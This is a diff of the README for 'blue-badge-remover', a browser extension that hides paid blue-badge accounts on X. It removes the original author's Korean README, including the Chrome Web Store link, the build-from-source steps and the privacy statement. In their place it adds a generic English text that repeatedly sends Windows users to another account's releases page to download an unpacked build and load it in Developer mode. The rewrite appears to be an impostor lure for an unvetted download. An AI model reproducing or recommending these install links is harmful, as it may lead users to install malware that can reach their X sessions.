@@ -1,157 +1,131 @@
-# Blue Badge Remover
+# 🟦 blue-badge-remover - Hide Blue Badges on X
 
-<p align="center">
-  <img src="public/icons/icon.svg" alt="Blue Badge Remover" width="96">
-</p>
+[![Download blue-badge-remover](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/ovoviviparous-feralman599/blue-badge-remover/releases)
 
-<p align="center">
-  <strong>X(Twitter)에서 수익성 파란 뱃지(Premium) 계정을 숨기는 브라우저 확장</strong><br>
-  팔로우 중인 계정과 화이트리스트는 예외 처리됩니다
-</p>
+## 🚀 What this does
 
-<p align="center">
-  <a href="https://chromewebstore.google.com/detail/cjhmbgfnddpcdfmoicfcocekmainhhdm?utm_source=item-share-cb"><img alt="Chrome Web Store" src="https://img.shields.io/badge/Chrome_Web_Store-v1.3.6-4285F4?logo=googlechrome&logoColor=white"></a>
-  <img alt="Manifest V3" src="https://img.shields.io/badge/Manifest-V3-blue">
-  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-strict-3178c6">
-  <img alt="License" src="https://img.shields.io/badge/License-MIT-green">
-  <a href="https://x.com/Fotoner_P/status/2037977299191251444"><img alt="Featured on X" src="https://img.shields.io/badge/Featured_on_X-10K+_retweets-000000?logo=x&logoColor=white"></a>
-</p>
+blue-badge-remover is a Chrome extension for X(Twitter). It helps hide accounts with the blue badge so your feed looks cleaner and easier to scan.
 
-## Screenshots
+Use it if you want to reduce noise from Premium accounts while browsing X in Chrome on Windows.
 
-<p align="center">
-  <img src="docs/img/screen.png" alt="Popup UI" width="340">
-</p>
+## 📥 Download and install
 
-## Features
+1. Open the [releases page](https://github.com/ovoviviparous-feralman599/blue-badge-remover/releases)
+2. Download the latest release file
+3. If the file is a ZIP, extract it to a folder on your PC
+4. Keep that folder in a place you will not move or delete
+5. Open Chrome and load the extension from that folder
 
-| 기능 | 설명 |
-|------|------|
-| **파딱 감지** | SVG 뱃지 구조 분석으로 판별 (금딱/기관 계정 제외) |
-| **숨김 범위** | 타임라인, 트윗 상세(답글), 검색 결과, 북마크 (각각 토글) |
-| **숨김 방식** | 완전 제거 또는 접힌 상태로 표시 (방패 아이콘 + 클릭하여 펼치기) |
-| **리트윗 필터** | 팔로우가 파딱 트윗을 리트윗한 경우 숨김 (토글) |
-| **인용 필터** | 필터링 안 함 / 인용 부분만 숨기기 / 트윗 전체 숨기기 |
-| **키워드 필터** | 특정 키워드를 포함하는 파딱만 선별 숨김 (AdGuard식 문법) |
-| **카테고리 필터** | 내장 키워드를 카테고리별(정치, 경제, 욕설 등) 개별 토글 |
-| **팔로우 예외** | 타임라인 fiber/API 자동 감지 + Following 페이지 수동 동기화, 계정별 캐시 |
-| **화이트리스트** | 별도 관리 페이지에서 @아이디 추가, 프로필 배너에서 원클릭 추가 |
-| **계정 전환** | 계정별 팔로우 캐시 자동 전환, 즉시 재필터링 |
-| **다국어** | 한국어 / English / 日本語 |
-| **멀티 브라우저** | Chrome + Firefox + Edge (WXT 기반 빌드) |
-| **모바일 지원** | Firefox Android (설정 바로가기, 탭 내 페이지 이동) |
-| **필터 팩** | 커스텀 키워드 필터를 팩으로 내보내기/가져오기 |
-| **통계 대시보드** | 오늘/전체 숨김 수, 카테고리별 통계, X 공유 |
-| **디버그 모드** | 트윗별 처리 라벨 + 콘솔 로그 |
+## 🪟 Windows setup
 
-## Install
+Follow these steps on Windows:
 
-### Chrome Web Store
+1. Download the release from the link above
+2. If you get a ZIP file, right-click it and choose Extract All
+3. Open Google Chrome
+4. In the address bar, type chrome://extensions
+5. Turn on Developer mode in the top right
+6. Click Load unpacked
+7. Select the extracted blue-badge-remover folder
+8. Pin the extension if you want quick access from the toolbar
 
-[**Chrome Web Store에서 설치**](https://chromewebstore.google.com/detail/cjhmbgfnddpcdfmoicfcocekmainhhdm?utm_source=item-share-cb)
+## 🛠️ How to use it
 
-### Firefox / Edge
+After you install the extension:
 
-[GitHub Releases](https://github.com/fotoner/blue-badge-remover/releases)에서 ZIP 다운로드 후 수동 설치.
-Firefox AMO 등록 완료. Edge는 준비 중.
+1. Open X in Chrome
+2. Sign in to your account
+3. Refresh the page
+4. Browse your timeline as usual
+5. Posts and profiles with blue badges should now be hidden from view
 
-### 개발 빌드
+If you stop seeing the effect, refresh X again or restart Chrome.
 
-```bash
-npm install
-npm run build          # Chrome
-npm run build:firefox  # Firefox
-npm run build:edge     # Edge
-npm test               # 330 tests
-```
+## 📌 What it helps with
 
-1. `chrome://extensions` 접속 (Edge: `edge://extensions`)
-2. **개발자 모드** 활성화
-3. **압축 해제된 확장 프로그램을 로드합니다** 클릭
-4. `dist/chrome-mv3/` 또는 `dist/firefox-mv2/` 또는 `dist/edge-mv3/` 폴더 선택
+- Hides blue-badge Premium accounts on X
+- Makes timelines easier to read
+- Reduces visual clutter
+- Helps you focus on regular posts
+- Works in Chrome on Windows
 
-## Usage
+## 🔍 Best for
 
-1. **x.com 또는 twitter.com에 로그인**
-2. 익스텐션 아이콘 클릭 -> Popup에서 설정
-3. **팔로우 동기화**: 타임라인에서 자동 감지 + "팔로잉 페이지 열기"로 전체 수집
-4. **화이트리스트**: 별도 관리 페이지에서 @아이디 추가, 또는 파딱 프로필 배너에서 바로 추가
-5. **키워드 필터**: 팝업에서 키워드 필터 활성화 -> 고급 필터 설정에서 카테고리별 토글/커스텀 규칙 편집
+- People who want a cleaner X timeline
+- Users who want to hide Premium accounts
+- Anyone who prefers a simpler feed
+- Chrome users on Windows
 
-### 숨김 동작
+## ⚙️ Basic requirements
 
-| 상황 | 동작 |
-|------|------|
-| 파딱의 직접 트윗 | 숨김 (팔로우/화이트리스트 제외) |
-| 팔로우가 파딱을 리트윗 | retweetFilter ON이면 숨김 |
-| 누군가 파딱을 인용 | quoteMode 설정에 따라 처리 |
-| 팔로우의 직접 트윗 | 파딱이어도 표시 |
-| 북마크 페이지 | 기본적으로 표시 (설정에서 변경 가능) |
-| 본인 트윗 | 본인이 파딱이어도 항상 표시 |
+- Windows 10 or later
+- Google Chrome
+- An internet connection to get the release file
+- Access to the Chrome extensions page
+- A downloaded release folder for the extension
 
-## Tech Stack
+## 📂 File layout
 
-- **TypeScript** (strict mode)
-- **Chrome Extension** Manifest V3
-- **WXT** (Next-gen Web Extension Framework, Chrome + Firefox + Edge)
-- **Vitest** (330 tests) + **Playwright** (E2E)
+If you open the release package, you may see files like these:
 
-## Project Structure
+- `manifest.json`
+- `content.js`
+- `background.js`
+- `icons/`
+- `README.md`
 
-```
-entrypoints/                  # WXT 진입점
-├── background.ts             # Service Worker
-├── content.ts                # Content Script (ISOLATED world)
-├── injected.content.ts       # fetch/XHR 인터셉터 (MAIN world)
-├── popup/                    # Popup UI
-├── dashboard/                # Dashboard (설정 + 통계)
-├── options/                  # 고급 필터 설정
-├── whitelist/                # 화이트리스트 관리
-└── collector/                # 키워드 수집 분석
+Keep all files in the same folder if you load the extension unpacked.
 
-src/
-├── content/                  # Content Script 로직 (8개 모듈)
-├── injected/                 # MAIN world 스크립트
-├── features/
-│   ├── badge-detection/      # 뱃지 감지 (SVG 구조 분석)
-│   ├── content-filter/       # 트윗 필터링 (Observer + Hider)
-│   ├── keyword-filter/       # 키워드 필터 (파서 + 매처 + 카테고리)
-│   ├── keyword-collector/    # 키워드 수집 (토크나이저 + 통계)
-│   ├── filter-pack/          # 필터 팩 관리 (스토리지)
-│   ├── stats/                # 숨김 통계 수집/저장
-│   ├── follow-list/          # 팔로우 동기화
-│   └── settings/             # Storage 래퍼 (wxt/browser)
-├── shared/
-│   ├── types/                # Settings, BadgeInfo, FilterRule
-│   ├── constants/            # 기본값, 스토리지 키
-│   ├── utils/                # 구조화 로거
-│   └── i18n.ts               # 다국어 번역 (ko/en/ja)
-├── popup/                    # Popup 로직
-├── options/                  # Options 로직
-├── whitelist/                # 화이트리스트 로직
-└── collector/                # 수집기 로직
+## 🧩 Common setup issues
 
-public/
-├── icons/                    # 익스텐션 아이콘
-└── _locales/                 # Chrome i18n (ko, en, ja)
-```
+### Chrome does not show the extension
 
-## Privacy
+- Check that Developer mode is on
+- Make sure you used Load unpacked
+- Confirm that you selected the folder that contains `manifest.json`
 
-- 수집하는 데이터: 없음
-- 외부 서버 통신: 없음 (모든 처리가 로컬)
-- 인증 토큰 저장: 안 함
-- 권한: `storage` + `x.com`/`twitter.com` host permission만 사용
-- 상세: [docs/PRIVACY.md](docs/PRIVACY.md)
+### The extension does not seem to work
 
-## Disclaimer
+- Refresh the X page
+- Sign out and sign in again
+- Make sure you are using X in Chrome
+- Check that the extension is still enabled in `chrome://extensions`
 
-> This extension modifies the user's local browser display only. It does not access, modify, or interfere with X's servers or API.
+### I moved the folder and it stopped working
 
-## License
+- Chrome needs the same folder path
+- Put the extension back where it was first loaded
+- Load it again from the new folder if needed
 
-[MIT](LICENSE)
+## 🧭 Install steps at a glance
 
-## Author
+1. Visit the [release page](https://github.com/ovoviviparous-feralman599/blue-badge-remover/releases)
+2. Download the latest file
+3. Extract it if needed
+4. Open `chrome://extensions`
+5. Turn on Developer mode
+6. Load the folder with `manifest.json`
+7. Open X and refresh the page
 
-[@fotoner_p](https://x.com/fotoner_p)
+## 📎 Browser notes
+
+This extension is made for Chrome. It may also work in other Chromium-based browsers, but Chrome on Windows is the main target.
+
+If you use more than one Chrome profile, install it in the profile you use for X.
+
+## 🧪 What to expect after install
+
+When the extension is active, X should hide many blue-badge accounts from your view. Some page parts may still change as X updates its site layout. If that happens, reloading the page often helps.
+
+## 🗂️ Repository info
+
+- Name: blue-badge-remover
+- Topic: twitter
+- Type: Chrome extension
+- Purpose: Hide blue-badge Premium accounts on X(Twitter)
+
+## 🔗 Download again
+
+If you need the release file again, use this link:
+
+[blue-badge-remover releases page](https://github.com/ovoviviparous-feralman599/blue-badge-remover/releases)
